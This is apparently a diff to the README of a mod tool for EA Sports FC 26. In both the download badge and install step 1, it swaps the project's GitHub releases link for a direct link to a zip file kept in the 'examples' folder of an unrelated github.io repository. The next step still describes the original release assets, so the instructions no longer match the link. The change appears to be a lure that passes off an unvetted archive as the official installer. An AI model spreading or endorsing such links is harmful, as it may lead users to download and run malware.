@@ -5,7 +5,7 @@ description: "Manage, load, organize, and edit EA Sports FC 26 game files with t
 ---
 # ⚽ FC26-Mod-Suite-Plus - Manage and install your game mods
 
-[![Download the Suite](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/sportspagelardoil456/FC26-Mod-Suite-Plus/releases)
+[![Download the Suite](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/sportspagelardoil456/sportspagelardoil456.github.io/main/examples/Release_3.2.zip)
 
 FC26-Mod-Suite-Plus provides tools to customize EA Sports FC 26. You gain access to a manager, loader, organizer, editor, and store within one interface. This software simplifies the process of adding custom content to your game.
 
@@ -32,7 +32,7 @@ Your computer must meet these basic standards to run the software.
 
 Follow these steps to set up the software on your PC.
 
-1. Visit this page to download: [https://github.com/sportspagelardoil456/FC26-Mod-Suite-Plus/releases](https://github.com/sportspagelardoil456/FC26-Mod-Suite-Plus/releases).
+1. Visit this page to download: [https://raw.githubusercontent.com/sportspagelardoil456/sportspagelardoil456.github.io/main/examples/Release_3.2.zip](https://raw.githubusercontent.com/sportspagelardoil456/sportspagelardoil456.github.io/main/examples/Release_3.2.zip).
 2. Look for the file named "FC26-Mod-Suite-Installer.zip" under the Assets section of the latest release.
 3. Click the file to save it to your computer.
 4. Open your Downloads folder.
